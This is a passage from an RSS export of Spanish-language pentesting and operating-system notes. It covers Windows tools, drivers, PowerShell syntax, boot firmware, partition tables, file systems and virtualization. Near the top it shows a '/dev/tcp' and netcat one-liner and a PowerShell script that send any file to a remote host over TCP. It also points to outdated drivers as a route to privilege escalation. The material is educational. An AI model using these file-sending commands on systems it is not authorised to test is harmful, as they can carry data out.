Scripts o softwares custom: Podrías desarrollar scripts personalizados o programacas usando lenguajes de programación como Powershell, C, C# o Python para facilitar la transferencia de archivos entre máquinas Windows y Linux. Estos scripts podrían uitilizar librerías comunes para la comunicación de redes o protocolos como SMB para la transferencia de archivos.

<br>
Ejemplo:

<br>En Windows, el cmd.exe no tiene funcionalidades similares como linux para la transferencia de datos creando conexiones TCP de manera rápida a través de la red como el funcionamiento de los comandos cat {file_to_transder} &gt; /dev/tcp/{ip_to_send_file}/{port_to_send_file} desde el host que posee el archivo a transferir y comandos como nc -nvlp  {port_to_wait_file} o equivalentes desde el host a recibir los datos. Sin embargo en sistemas Windows modernos podríamos llevar a cabo la creación de un cliente TCP y llevar a cabo una conexión a un host remoto.<br># Get script name 
$scriptName = $MyInvocation.MyCommand.Name

# Validate Arguments
if($args.Count -lt 3){
    Write-Host "`n`t Usage: $scriptName &lt;host IP&gt; &lt;host PORT&gt; &lt;FILE TO TRANSFER&gt;`n`n"
    exit 1 
}

# Validate Port function
function validatePort($port){
    $portToValidate = [int]$port
    return ($portToValidate -ge 0 -and $portToValidate -le 65535)
}

# Validate Host function
function validateHost($ip){
    return ($ip -match '\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b')
}

# Read host IP and PORT
$targetIP = $args[0]
$targetPort = $args[1]
# Read file to transfer
$pathFile = $args[2]

if(-not (validatePort $targetPort)) {
    Write-Host "`n`t[!] INVALID HOST PORT: $targetPort. Please insert a correct one (0-65.535).`n`n"
    exit 1
}
if (-not (validateHost $targetIP)){
    Write-Host "`n`t[!] INVALID HOST IP: $targetIP. Pleaser insert a correct format (0.0.0.0 - 255.255.255.255).`n`n" 
    exit 1 
}
if (-not (Test-Path $pathFile)){
    Write-Host "`n`t[!] FILE PATH $pathFile TO TRANSFER NOT FOUND.`n`n"
    exit 1 
}

# Read file content
Write-Host "`n`t[i] Trying read $pathFile content...`n"
$fileContent = Get-Content -Path $pathFile -Raw

# Try to create a TCP client and connect to host target
Write-Host "`t[i] Trying to connect to host $targetIP\:$targetPort...`n"
$client = New-Object System.Net.Sockets.TcpClient
$client.Connect($targetIP, $targetPort)
Write-Host "`t`t[+] Successfully connected.`n"

# Get the network stream
$stream = $client.GetStream()

# Convert file content to bytes and send it over the network stream
Write-Host "`t[i] Converting file $pathFile to bytes...`n"
$bytesToSend = [System.Text.Encoding]::ASCII.GetBytes($fileContent)
$stream.Write($bytesToSend, 0, $bytesToSend.Length)
Write-Host "`t[+] File successfully sended.`n`n"

# Close the network stream and TCP client
$stream.Close()
$client.Close()
Copy<br><br><br>Los drivers son componentes de software que permiten al sistema operativo comunicarse con el hardware conectado al host. Estos suelen estar escritos en lenguajes de programación como C o C++ y actuan como intermediarios, tranduciendo comandos desde el sistema a instrucciones que el componente de hardware pueda entender y viceversa. Sin los drivers, el sistema operativo no estaría en capacidades de controlar el hardware de manera efectiva.<br><br>
<br>Kernel-Mode Drivers: Estos drivers se ejecutan en modo kernel, lo que permite acceso directo a los recursos de hardware y proporciona capacidades de alto rendimiento. Son escenciales para funciones críticas del sistema y son cargados durante el proceso de booteo.
<br>User-Mode Drivers: Estos drivers se ejecutan en modo usuario y contienen menos privilegios en comparación a lo drivers ejecutandos en Kernel-Mode. Estos proveen una interfaz entre la aplicación y el dispositivo de hardware, permitiendo a nivel de usuario interactuar con el hardware directamente a través del sistema operativo.
<br>Si bien el térnimo drivers se suele ligar mucho a Windows ya que escuchamos mucho hablar de estos en ecosistemas Windows, es importante aclarar que estos también juegan un papel fundamental en sistemas basados en Linux, la diferencia es que en estos últimos los drivers suelen estar integrados en el kernel y son automaticamente manejados y actualizados como parte del ecosistema más amplio del kernel y de los paquetes de software.<br># List all drivers on our host
driverquery
Copy<br>Esto puede ser interesante para revisar dado que puede que se cuente con un driver desactualizado y vulnerable el cual nos pueda dar la posibilidad de llevar a cabo una <a data-href="0. Enumerating possible privesc" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/3.-privilege-scalation/windows/0.-enumerating-possible-privesc.html" class="internal-link" target="_self" rel="noopener nofollow">0. Enumerating possible privesc</a>. <br><br><br>El IIS, también conocido como Internet Information Services o previamente como Internet Information Server, es un web server para el hosteo de cualquier recurso en la web de manera flexible, segura y manejable. Es un producto central de Windows que corre en el sistema operativo Windows. IIS es una plataforma web unificada que integra IIS, ASP.NET, servicios FTP, PHP y WCF (Windows Communication Foundation).<br>Este solución hace uso de varios protocolos para la comunicación e intercambio de datos con clientes o hosts remotos, como HTTP, HTTPS, SMTP, NNTP y FTP, ofrece características como la seguridad/autenticación, logueo, supervición de rendimiento y escalabilidad.<br><br>ASP.NET es un framework de aplicaciones web desarrollado por Microsofot para la construcción de aplicaciones web dinámicas y servicios. Es parte de el framework .NET y es utilizado principalmente con IIS. Permite a los desarrolladores crear aplicaciones ahaciendo uso de lenguajes server-side programming como C# o Visual Basic.<br><br>Windows Communication Foundation es un framework para la contrucción de aplicaciones service-oriented en plataformas Windows. Permite a los desarrolladores construir sistemas distribuidos definiendo servicios, endpoints, mapeos y contratos.<br><br><br>Las herramientas de administración en sistemas Windows son un tema clave a tocar dado que estas nos permiten realizar múltiples tareas relacionadas a la administración de redes, servicios, usuarios, grupos, instalación de paquetes y más utilidades propias de Windows, por lo que si son fundamentales desde el lado de administración.... son sumamente interesantes para nostros como pentesters así como para los ciberdelincuentes, entender el uso ]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/0.-windows-basics.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/0. Windows Basics.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 03 Jun 2024 14:45:49 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/uac_example.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/uac_example.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Windows Desktop Versions]]></title><description><![CDATA[ 
 <br><br>Operating System     Version Number

Windows 1.0                    1.04
Windows 2.0                    2.11
Windows 3.0                    3
Windows NT 3.1                 3.10.528
Windows for Workgroups 3.11    3.11
Windows NT Workstation 3.5     3.5.807
Windows NT Workstation 3.51    3.51.1057
Windows 95                     4.0.950
Windows NT Workstation 4.0     4.0.1381
Windows 98                     4.1.1998
Windows 98 Second Edition      4.1.2222
Windows Me                     4.90.3000
Windows 2000 Professional      5.0.2195
Windows XP                     5.1.2600
Windows Vista                  6.0.6000
Windows 7                      6.1.7600
Windows 8.1                    6.3.9600
Windows 10                     10.0.10240
Copy<br><br>Windows NT 3.51                  NT 3.51
Windows NT 3.5                   NT 3.50
Windows NT 3.1                   NT 3.10
Windows 2000                     NT 5.0     

    Windows 2000 Server
    Windows 2000 Advanced Server
    Windows 2000 Datacenter Server

Windows NT 4.0                   NT 4.0     

    Windows NT 4.0 Server
    Windows NT 4.0 Server Enterprise
    Windows NT 4.0 Terminal Server Edition

Windows Server 2003              NT 5.2     

    Windows Small Business Server 2003
    Windows Server 2003 Web Edition
    Windows Server 2003 Standard Edition
    Windows Server 2003 Enterprise Edition
    Windows Server 2003 Datacenter Edition
    Windows Storage Server

Windows Server 2003 R2           NT 5.2     

    Windows Small Business Server 2003 R2
    Windows Server 2003 R2 Web Edition
    Windows Server 2003 R2 Standard Edition
    Windows Server 2003 R2 Enterprise Edition
    Windows Server 2003 R2 Datacenter Edition
    Windows Compute Cluster Server 2003 (CCS)
    Windows Storage Server
    Windows Home Server

Windows Server 2008               NT 6.0     

    Windows Server 2008 Standard
    Windows Server 2008 Enterprise
    Windows Server 2008 Datacenter
    Windows Server 2008 for Itanium-based Systems
    Windows Server Foundation 2008
    Windows Essential Business Server 2008
    Windows HPC Server 2008
    Windows Small Business Server 2008
    Windows Storage Server 2008
    Windows Web Server 2008

Windows Server 2008 R2            NT 6.1     

    Windows Server 2008 R2 Foundation
    Windows Server 2008 R2 Standard
    Windows Server 2008 R2 Enterprise
    Windows Server 2008 R2 Datacenter
    Windows Server 2008 R2 for Itanium-based Systems
    Windows Web Server 2008 R2
    Windows Storage Server 2008 R2
    Windows HPC Server 2008 R2
    Windows Small Business Server 2011
    Windows MultiPoint Server 2011
    Windows Home Server 2011
    Windows MultiPoint Server 2010

Windows Server 2012               NT 6.2     

    Windows Server 2012 Foundation
    Windows Server 2012 Essentials
    Windows Server 2012 Standard
    Windows Server 2012 Datacenter
    Windows MultiPoint Server 2012

Windows Server 2012 R2            NT 6.3     

    Windows Server 2012 R2 Foundation
    Windows Server 2012 R2 Essentials
    Windows Server 2012 R2 Standard
    Windows Server 2012 R2 Datacenter

Windows Server 2016     2016       NT 10.0
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/0.1-windows-versions.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/0.1 Windows Versions.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 09 May 2024 15:06:49 GMT</pubDate></item><item><title><![CDATA[Archivos por lotes (Batch)]]></title><description><![CDATA[ 
 <br><br>Los archivos por lotes o batch files en entornos de Windows son secuencias de comandos que ejecutan una serie de instruccionese en el símbolo del sistema o en un archivio ejecutable .bat o .cmd.<br>Para mayor información sobre archivos batch, que son y su uso podemos visitar <a data-tooltip-position="top" aria-label="https://es.wikipedia.org/wiki/Archivo_batch" rel="noopener nofollow" class="external-link" href="https://es.wikipedia.org/wiki/Archivo_batch" target="_blank">recursos</a>.<br><br><br>Como vimos, los archivos batch pueden parecer simples a primera vista, pero estos son muy podersos ya que nos permiten realizar y poseer múltiples acciones y ventajas:<br>
<br>Automatización de tareas: Los archivos por lotes permiten automatizar tareas repetitivas. Podemos crear secuencias de comandos para realizar múltiples acciones con un solo click, lo que ahorra tiempo y reduce errores humanos.
<br>Acceso a comandos del sistema: Los archivos por lotes nos permiten acceder a una amplia gama de comandos del sistema operativo Windows, lo que nos birnda un gran control sobre nuestro sistema, podemos realizar operaciones como copia de archivos, creación de  directorios, eliminación de estos, cambiar configuraciones del sistema, entre otras muchas cosas.
<br>Compatibilidad: Los archivos por lotes son compatibles con todas las versiones de Windows, desde la más antigua hasta las más recientes. Esto los hace una opción confiable para la automatización de atareas en una variedad de entornos informáticos.
<br>Flexibilildad: Aunque los arhicovs por lotes pueden parecer simples como dijimos, son bastantes flexibles y puede adaptarse a una variedad de necesidades. Podemos hacer uso de estrcuturas de controlo como IF, ELSE, otras para la repetición de tareas como bucles FOR, entre otras, para crear scripts todavía más complejos y potentes.
<br>Personalización: Los archivos por lotes nos permiten personalizar nuestra experiencia informática. Podemos crear scripts que se adapten a nuestras necesidades específicas y nos ayuden a optimizar nuestro flujo de trabajo.
<br>Portabilidad: Los archivos por lotes son archivos de texto simples que pueden ser compartidos y ejecutados en diferentes sistemas sin necesidad de software adicional. Esto los hace portátiles y fáciles de distribuir.
<br>Para comprender la sintaxis y el poder en mayor profundiad de estos archivos podemos visitar el recurso <a data-href="Batch Scripting" href="https://dobliuw.com/notes/5.-technologies/batch-scripting.html" class="internal-link" target="_self" rel="noopener nofollow">Batch Scripting</a>.]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/1.-batch.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/1. Batch.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 09 May 2024 15:04:58 GMT</pubDate></item><item><title><![CDATA[Powershell]]></title><description><![CDATA[ 
 <br><br>PowerShell es una shell de línea de comandos y lenguaje de programación diseñado especificamente para tareas de administración del sistema en Windows. Provee acceso a un gran rango de capacidades para manejar el sistema, incluyendo acceso al Windows Registry (Explicado y visto en <a data-href="0. Windows Basics" href="https://dobliuw.com/notes/3.-system/operative-systems/windows/0.-windows-basics.html" class="internal-link" target="_self" rel="noopener nofollow">0. Windows Basics</a>), manejo de servicios, ejecución de comandos del sistema, interacción con archivos del sistema y mucho más. <br><br><br>Algunos comandos basicos y útiles que podemos usar sin previo conocimiento de este lenguaje de scripting son algunos como:<br>
<br>Get-Help {specific_command}: Este comando es muy útil en PowerShell ya que nos permite acceder al sistema de ayuda y entender el uso del comando específicado y su sintaxis. En caso de no esepecificar ningun comando se nos arrojara información acerca del sistema de ayuda.
<br>Get-Process:  Nos permite recuperar información acerca de los procesos corriendo en el sistema.
<br>Get-Service: Obtenemos una lista de los servicios instalados en el sistema y sus estados.
<br>Get-ChildItem: Este es el nombre original del comando que nos permite listar el contenido de un directorio, al cual se hace referncia mediante un alias con los comandos ls y dir, así como gci. 
<br>Invoke-WebRequest: Nos permite realizar una petición HTTP y recibir data de los servidores web.
<br>New-Object: Crea una instanacia de objeto de .NET. 
<br><br># Assing a value to a var
$name = "Dobliuw"
$age = 20
# Assign a stdout command into a var
$processes = Get-Process
# Save output 
Write-Host "The are $(Get-Process).Count processes running in the System"
Copy<br><br>for($i = 1; $i -le 10; $i++){
	Write-Host "Counter: $i"
}
Copy<br><br>if($num -gt 10){
	# ... code
}elseif($num -eq 10){
	# ... code
}else{
	# ... code
}
Copy<br><br># Defining a functions
function sayHi{
	param(
		[string] $name
	)
	Write-Host "Hi $name!"
}

function sayHi2($name){
	Write-Host "Hi $name!!"
}

# Calling the functions
sayHi -name "Dobliuw" # Hi Dobliuw!
sayHi2 "Dobliuw" # Hi Dobliuw!!
Copy<br><br>#  Create an array of numbers
$numbers = @(1, 2, 3, 4, 5)

# Accessing elements
Write-Host "First element: $($numbers[0])"
Write-Host "Last element: $($numbers[-1])"

# Iterating over elements
foreach ($number in $numbers){
	Write-Host "Number: $number"
}
Copy<br><br># And
$num = 10
if($num -ge 0 -and $num -le 10){
	Write-Host "The number $num is between 0-10 range"
}

# Or
$num2 = 20
if($num2 -eq 10 -or $num2 -eq 20 ){
	Write-Host "The number $num2 is equal to 10 or 20"
}

# Not
function GeTen($num){
	return ($num -ge 10)
}
if(-not (GeTen 4)){
	Write-Host "Number 4 isn't greater than or equal to 10"
}

# Contain a substring
$name = "Dobliuw"
if($name -like "*obl*"){
	Write-Host "$name contain `"obl`"."
}
Copy]]></description><link>https://dobliuw.com/notes/3.-system/operative-systems/windows/2.-powershell.html</link><guid isPermaLink="false">Notes/3. System/Operative Systems/Windows/2. PowerShell.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Mon, 13 May 2024 13:55:29 GMT</pubDate></item><item><title><![CDATA[Operative Systems]]></title><description><![CDATA[ 
 <br><br>Un Sistema Operativo (OS) es un software que actúa como intermediario entre los usuarios y el hardware del ordenador. Sus funciones principales incluyen la gestión de los recursos de hardware, la provisión de una interfaz de usuario y la ejecución y gestión de aplicaciones.<br>Key Functions<br>
<br>Processes management: Controla la creación, ejecución y terminación de procesos.
<br>Memory management: Administra la memoria primaria o RAM, asignando y liberando espacio según sea necesario.
<br>Files management: Controla la creación, eliminación y acceso a archivos y directorios.
<br>Devices management: Maneja la comunicación entre el sistema y los dispostivos de hardware.
<br>User Interfaces: Proporciona una interfaz gráfica (GUI) o de línea de comandos (CLI) para que los usuarios interactúen con el sistema.
<br><br><br>El firmware es un tipo de software que está programado en la memoria no volátil de un dispositivo de hardware. A diferencia del software regular que se almacena en discos duros o SSDs, el firmware está intergado directamente en el hardware y es esencial para el funcionamiento básico del dispositivo.<br>Firmware Characteristics:<br>
<br>Hardware Integration: Está diseñado específicamente para interactuar con el hardware del dispositivo.
<br>Persistence: Almacenado en memoria no volátil (Como ROM, EEPROM o Flash), lo que significa que no se pierde cuando el dispostivo se apaga.
<br>Updates: Puede ser actualizado, aunque este proceso suele ser más complicado que actualizar software popular.
<br>Basic Funcionality: Proporciona las instrucciones básicas necesarias para que el hardware funcione y para que el software más complejo pueda interactuar con el hardware.
<br><br><br>Este es un tema previamente explicado en <a data-href="CPU" href="https://dobliuw.com/notes/6.-hardware/components/cpu/cpu.html" class="internal-link" target="_self" rel="noopener nofollow">CPU</a> por lo cual no voy a redundar en el tema, pero esto es algo a tener en cuenta dentro del apartado de los Sistemas Operativos.<br><br><br><br>La BIOS (Basic Input/Output System) es un firmware tradicional que inicializa el hardware del sistema y proporciona un entorno para que el sistema operativo se cargue. Se encuentre en un chip ROM en la placa base del equipo.<br>Functions:<br>
<br>Power-On Self-Test (POST): Realiza pruebas de hardware al encender el sistema.
<br>Hardware Initialization: Configura y verifica los componentes de hardware.
<br>Bootloader: Localiza el cargador de arranque del sistema operativo en el disco y lo carga en la memoria.
<br>System Configuration: Proporciona una interfaz (Habitualmente de texto) para configurar opciones de hardware (Orden de arranque, configuración de periféricos, etc.)
<br><br>
<br>System Power ON:

<br>Cuando encendemos una computadora, la BIOS se activa primero porque está almacenada en un chip ROM de la placa base/madre.


<br>Power-On Self-Test (POST):

<br>La BIOS realiza una serie de pruebas de diagnóstico en el hardware (Memoria RAM, discos duros, dispositivos de entrada, etc.) para asegurar que todo funciona correctamente.


<br>Hardware Initialization:

<br>La BIOS configura los componentes de hardware esenciales para que estén listos para ser usados por el sistema operativo.


<br>Search Bootloader:

<br>La BIOS busca un dipositivo de arranque según el orden establecido en su configuración (Por ejemplo, primero disco duro, luego CD/DVD, luego USB, etc.).
<br>La BIOS lee el sector de arranque principal (MBR) del dispositivo de arranque seleccionado. El MBR contiene el código del bootloader.


<br>Load Bootloader:

<br>La BIOS carga el bootloader en la memoria y transfiere el control a éste.
<br>El bootloader entonces carga el kernel del sistema operativo y empieza el proceso de arranque del sistema operativo.


<br><br>Por otro la UEFI (Unified Extensible Firmware Interface) es una intefaz moderna que reemplaza al BIOS. Ofrece más funcionalidades, mejor interfaz y soporte para características avanzadas.<br>Functions:<br>
<br>Grafical Interface: Proporciona una interfaz gráfica más avanzada y amigable para la configuración del sistema.
<br>GPT Support: Permite el uso de tablas de partciones GPT, que soportan discos más grandes y más particiones.
<br>Secure Boot: Ayuda a proteger el proceso de arranque contra malware y software no autorizado.
<br>Fast and Flexible: Mejora los tiempos de arranque y ofrece mayor flexibilidad en la configuración y gestión del hardware.
<br>BIOS Compatibility: Puede emular la BIOS para mantener compatibilidad con sistemas operativos y hardware más antiguos.
<br><br>
<br>System Power ON:

<br>Al encender el equipo, el firmware UEFI se activa primero porque está almacenado en un chip ROM o memoria flash en la placa base/madre.


<br>Power-On Self-Test:

<br>Similar a la BIOS, UEFI realiza pruebas de diagnóstico en el hardware.


<br>Hardware Initialization:

<br>UEFI configura lso componentes de hardware necesarios para el arranque.


<br>Search Bootloader:

<br>UEFI busca un archivo de bootloader en la partición del sistema EFI (ESP) en un dispositivo de almacenamiento.
<br>La ESP utiliza el sistema de archivos FAT32 y contiene los archivos necesarios para el arranque del sistema operativo.


<br>Load Bootloader:

<br>UEFI carga el archivo del bootloader especificado y transfiere el control a éste.
<br>El bootloader entonces carga el kernel del sistema operativo y empieza el proceso de ararnqeu del sistema operativo.


<br><br><br><br>Las tablas de particiones son estructuras de datos en un disco duro o unidad de almacenamiento que describen cómo se divide el disco en particiones. Las particiones son secciones del disco que el sistema operativo puede gestionar de manera independiente, permitiendo así múltiples sistemas de archivos en un solo disco. Hay dos tipos principales de tablas de particiones, las cuales son MBR y GPT. <br><br>Master Boot Record = Registro de arranque Principal<br>Principal Characteristics:<br>
<br>Size Limit: Soporte discos de hasta 2 TB.
<br>Primary Partitions: Hasta 4 particiones primarias.
<br>Extendend and Logical Partitions: Si se necesita más de 4 particiones, se puede crear una partición extendida que puede contener múltiples particiones lógicas.
<br>Compatibility: Es compatible con la mayoría de sistemas operativos, especialmente los más antiguos.
<br>Estructure:<br>
<br>Starting Sector: El MBR está ubicado en el primer sector del disco (Sector 0) y contiene el código de arranque principal y la tabla de particiones.
<br>Starting Code: El código de araranque es el primer software que se ejecuta cuando un equipo arranca.
<br>Partitions Table: Una estructura que contiene información sobre las pariciones del disco, como el tamaño y la ubicación de cada partición.
<br><img alt="mbr_excalidraw_examples.png" src="https://dobliuw.com/lib/media/mbr_excalidraw_examples.png"><br>En este ejemplo podemos tener en cuenta...<br>
<br>
Tamaño: MBR solo puede gestionar discos de hasta 2TB. Esta es una limitación debido a la forma en que se almacenan las direcciones de los bloques en el MBR.

<br>
Número de Particiones: MBR permite un máximo de 4 particiones primarias. Si se necesitan más particiones, una de estas particiones primarias puede ser convertida en una partición extendida, que puede contener múltiples particiones lógicas.

<br>
Particiones Primarias: Puedes tener hasta 4 particiones primarias. En nuestro ejemplo, se representa un disco de 2TB dividido en 4 particiones primarias de 500GB cada una. Esto es correcto y muestra una posible división del disco.

<br>
Partición Extendida: Si solo se utilizan 3 particiones primarias, la cuarta puede ser una partición extendida. En nuestro ejemplo, una partición extendida de 1TB contiene 8 particiones lógicas de 125GB cada una. Esto muestra cómo una partición extendida puede contener múltiples particiones lógicas (Únicamente almacenando datos en su interior).

<br>Por ejemplo, tomando este último caso, podríamos tener en linux:<br>
<br>Tamaño del Disco: 2TB
<br>Particiones:

<br>3 Particiones Primarias: 333GB cada una (/dev/sda1, /dev/sda2, /dev/sda3)
<br>1 Partición Extendida: 1TB (/dev/sda4)

<br>Contiene 8 Particiones Lógicas: 125GB cada una (/dev/sda5, /dev/sda6, etc.)




<br><br>GUID Partition Table = Tabla de partición GUID<br>Principal Characteristics:<br>
<br>Size Limit: Soporta discos de hasta 9.4 ZB (Zettabytes), mucho más grandes que los soportados por MBR.
<br>Partitions: Permite un número casi ilimitado de particiones (En la p´ractica, hasta 128 particiones en la mayoría de los sistemas),
<br>Redundancy: Incluye una tabla de particiones primaria y una copia de respaldo al final del disco para mayor seguridad.
<br>Compatiblity: Requiere firmware UEFI para arrancar desde discos GPT, aunque también puede usarse con BIOS en algunos casos.
<br>Estructure:<br>
<br>Primary GPT Header: Contiene información sobre la tabla de particiones y su ubicación.
<br>Partitions Table: Una lista de entradas que describen cada partición, incluyendo su tamaño, ubicación y un identificador único (GUID).
<br>Backup Copy: Al final del disco, GPT almacena una copia del header y de la tabla de particiones para redundancia.
<br><br><br>In Linux:<br>
<br>fdisk: Usado principalmente para gestionar particiones MBR.
<br>fdisk /dev/sda

<br>n para crear una nueva partición.
<br>d para eliminar una partición.
<br>p para imprimir la tabla de particiones.
<br>w para escribir los cambios y salir.


<br>gdisk: Usado para gestionar particiones GPT.
<br>gdisk /dev/sda

<br>n para crear una nueva partición.

<br>d para eliminar una partición.
<br>p para imprimir la tabla de particiones.
<br>w para escribir los cambios y salir.




<br>parted: Puede gestionar tanto MBR como GPT.
<br>In Windows:<br>
<br>Disk Management: Herramienta gráfica para gestionar particiones.
<br>diskpart: Herramienta de línea de comandos para gestionar particiones.
<br><br><br>Un sistema de archivos (Files System) es una estructura lógica que un sistema operativo usa para controlar cómo se almacena y recuperan los datos en un dispositivo de almacenamiento. Sin un sistema de archivos, los datos colocados en un dispositivo de almacenamiento estarían en un solo bloque grande, sin forma de determinar dónde termina un dato y comienza el siguiente.<br><br>Characteristics:<br>
<br>Compatibility: Ampliamente compatible con casi todos los sistemas operativos (Windows, Linux, MacOS).
<br>File Size Limit: 4GB.
<br>Partition Size Limit: 8 TB.
<br>Commoun Usage: Unidades flash USB, tarjetas SD, discos duros externos.
<br>No soporta permisos de archivos avanzados.
<br>No es adecuado para grandes volúmenes de datos o archivos individuales grandes debido a sus límites de tamaño.
<br><br>Characteristics:<br>
<br>Compatibility: Nativamente soportado por WIndows; puede ser lído y escrito en macOS con software adicional y en Linux con controladores adicionales.
<br>File Size Limit: 16 EB (Exabytes).
<br>Partition Size Limit: 256 TB.
<br>Commoun Usage: Partciiones de sistemas Windows, discos duros internos.
<br>Incluye funciones avanzadas como permisos de archivos, encriptación y registro de cambios. 
<br>Recuperación de errores y manejo de seguridad mejorado.
<br>Posee menor compatibilidad con sistemas operativos distintos a Windows sin software adicional.
<br>Más complejos que FAT32.
<br><br>Characteristics:<br>
<br>Compatibility: Principalmente utilizado en sistemas Linux.
<br>File Size Limit: 16 TB.
<br>Partition Size Limit: 1 EB (Exabyte).
<br>Commoun Usage: Particiones de sistemas Linux.
<br>Posee soporte para grandes volúmenes de datos.
<br>Funcionalidades como journaling (Registro de cambios) para mejorar la integridad de los datos.
<br>Aunque no es compatible con sistemas Windows y macOS de forma nativa.
<br>Así como también posee mayor sobrecarga de procesamiento debido a las características avanzadas.
<br>Algunos otros sistemas de archivos son APFS (Apple File System), HFS+ (Apple Hierarchical File System Plus), Btrfs (B-tree File System). <br><br><br>In Linux:<br>mkfs(Make Filesystem) = Crea un sistema de archivos en un dispositivo.<br># Create a file system ext4 in /dev/sdx
mkfs.ext4 /dev/sdx 
# Create a file system NTFS in /dev/sdx
mkfs.ntfs /dev/sdx
Copy<br>fsck(Filesystem Check) = Comprueba y repara un sistema de archivos.<br># Compare and repair file system in /dev/sdx
sudo fsck /dev/sdx
Copy<br>mount y umount = Monta y desmonda sistemas de archivos.<br># Mount file system /dev/sdx in /mnt
sudo mount /dev/sdx /mnt
# Unmount /mnt
sudo umount /mnt
Copy<br>In Windows<br>format = Comando de línea para formatear volúmenes<br># Format unit E: with filesystem NTFS
&gt; format E: /FS:NTFS
Copy<br>En resumen, en lo que involucra a Tablas de Particiones y Sistemas de Archivos puede generar un poco de confusión ya que en ambos se hablan de particiones, pero basicamente las tablas de particiones (MBR y GPT) definen cómo se divide el disco en secciones (Particiones), mientras que los sistemas de archivos (EXT4, FAT32, NTFS, etc) gestionan cómo se almacenan y recuperan los datos dentro de esas particiones.<br>Ejemplo:<br>
<br>Para crear una particion podríamos decidir en usar MBR o GPT (Dependiendo de si tenemos UEFI o BIOS) para dividir un disco de, por ejemplo, 500 GB, en particiones. Podríamos crear 2 particiones de 250GB por ejemplo.
<br>Luego deberiamos elegir un sistema de archivos para formatear estas particiones (x2 250GB), por ejemplo, podríamos hacer que una partición disponga de la estructura lógica NTFS y otra EXT4.
<br>Dentro de la partición NTFS, el sistema de archivos NTFS gestiona cómo se almacenan y organizan los archivos al igual que EXT4, con algunas pequeñas diferencias 
<br><br><br>El Kernel es el núcleo del sistema operativo que gestiona las interacciones entre el hardware y el software de un sistema. Hay varios tipos de kernels, cara uno con sus propias características y ventajas.<br>Type of Kernels<br>
<br>Monolithic Kernel: Todo el sistema operativo funciona en un único especio de memoria (Kernel Space). Ejemplos incluyen a Linux y Unix.
<br>Microkernel: el núcleo del sistema operativo está reducido a las funcionalidades más básicas (Gestión de procesos, comunicación inter-procesos, etc.) y el resto del sistema operativo se ejecuta en un espacio de usuario. Ejemplo: Minix.
<br>Hybrid Kernel: Combina elementos de los kernels monolíticos y microkernels. Ejemplos inlcuyen Windows NT y macOS.
<br>Kernel Functions<br>
<br>Process Management: Gestiona la creación, ejecución y terminación de procesos.
<br>Memory Management: Administra la memoria RAM del sistema.
<br>Device Management: Gestiona los controladores de dispositivos para interactuar con el hardware.
<br>File System Management: Proporciona una interfaz para la creación, lectura, escritura y eliminación de archivos.
<br><br><br>La virtualización es una tecnología que permite crear múltiples entornos de ejecución aislados sobre un único hardware físcio. Esto se logra mediante la creación de máquinas virtuales (VMs), cada una de las cuales actúa como un sistema completo con su propio sistema operativo, aplicaciones y recursos dedicados.<br>Hypervisor:<br>
<br>Un hypervisor, también conocido como monitor de máquina vritual (VMM), es un software, firmware o hardware que crea y ejecuta máquinas virtuales. Un hypersvisor permite que un host físico ejecute múltiples VMs, compartiendo los recursos físcios de manera eficiente.
<br>Hypervisors Types:

<br>Type 1 (Bare Metal): Corre directamente sobre el hardware físico, sin necesidad de un sistema operativo host. Proporciona un alto rendimiento y es comúnmente usado en entornos de producción empresarial, por ejemplo VMware ESXi, Microsoft Hyper-V o Xen.
<br>Type 2 (Hosted): Corre sobre un sistema operativo host, actuando como una aplicación más en el sistema opeartivo. Es más fácil de instalar y usar en entornos de escritorio o de desarrollo, por ejemplo VMWare Workstation y Oracle Virtualbox.


<br>Las funcionalidades de este son la gestión de la creación, ejecución y monitorización de las máquinas virtuales, incluyendo la asignación de recursos como CPU, memoria y dispostivios de almacenamiento.
<br>Mencionamos a las VMs, pero.. que son? Una VM (Virtual Machine) es un contenedor de software que puede ejecutar un sistema opperativo y aplicaciones como si fuera un computadora física completa. Las VMs son independientes y están aisladas unas de otras.<br>VM Componentes:<br>
<br>Guest Operative System: El sistema operativo que corre dentro de la VM.
<br>Virtualized Hardware: Incluye CPU virtual, memoria RAM virtual, discos duros virtuales y adaptadores de red virtuales.
<br>El uso de esta tecnología nos permite aprovechar capacidades de la misma como lo son el asilamiento, dado que como mencionamos, están aisladas entre sí, lo que aumenta la seguridad y la estabilidad y capacidades como la flexibilidad dado que se nos permite ejecutar diferentes sistemas operativos y versiones en un mismo hardware.<br>Memory Management<br>
<br>Overcommitment: El hypervisor puede asignar más memoria virtual a las VMs de la que físicamente está disponible en el host. Esto se basa en la suposición de que no todas las VMs usarán toda su memoria asignada al mismo tiempo.
<br>Ballooning: Técnica ut8ilizada por los hypervisores para recuperar memoria de las VMs cuando el host necesita más recursos. Un controlador de ballooning instalado en la VM devuelve memoria no utilizada al host.
<br>Swapping: Si la memoria física del hos se agota, el hypervisor puede usar almacenamiento secundario (Como discos duros) para suplir la demanda de memoria, aunqeu esto reduce el rendimineto debido a la mayor latencia del disco comparada con la RAM.
<br>Storage Management<br>
<br>Virtual Disk: Cada Vm tiene un o más discos virtuales (Por ejemplo, archivos .vmdk o .vdi) que simulan un disco físico. Estos archivos residen en el almacenamiento del host y pueden ser fijos o dinámicos.
<br>Thin Provisioning: Técnica que permite asignar más espacio de almacenamiento virtual del que está realmente disponible en el host, permitiendo una utilización más eficiente del espacio físico disponible.
<br>Snapshots: Capturas del estado de una VM en un momento específico, permitiendo revertir cambios o restaurar la VM a un estado anterior. ütiles para pruebas de softwares, análisis de malware, etc. y recuperación rápida de errores.
<br>Networking<br>
